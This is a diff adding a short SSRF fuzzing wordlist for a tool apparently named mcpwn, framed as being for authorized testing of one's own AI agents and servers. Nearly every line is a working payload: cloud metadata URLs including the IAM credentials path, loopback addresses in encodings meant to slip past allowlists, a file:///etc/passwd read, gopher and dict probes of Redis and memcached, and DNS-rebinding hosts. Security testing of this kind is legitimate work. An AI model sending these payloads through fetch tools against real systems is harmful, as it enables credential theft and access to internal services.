@@ -1,0 +1,28 @@
+# mcpwn SSRF seed wordlist — for AUTHORIZED testing of your own agents/servers.
+# One payload per line; '#' lines are comments. Feed into a URL/host/endpoint
+# argument (fuzzArgs) of a tool that fetches a remote resource and observe
+# whether the server follows the request to an internal/metadata target.
+#
+# Cloud metadata endpoints (SSRF -> credential theft is the classic impact).
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://[fd00:ec2::254]/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://100.100.100.100/latest/meta-data/
+# Loopback / localhost in assorted encodings that naive allowlists miss.
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+http://0177.0.0.1/
+http://2130706433/
+http://0x7f000001/
+# Alternate schemes often reachable through a URL fetcher.
+file:///etc/passwd
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stats
+# DNS-rebinding / redirect-style bait (point these at a host you control).
+http://127.0.0.1.nip.io/
+http://localtest.me/
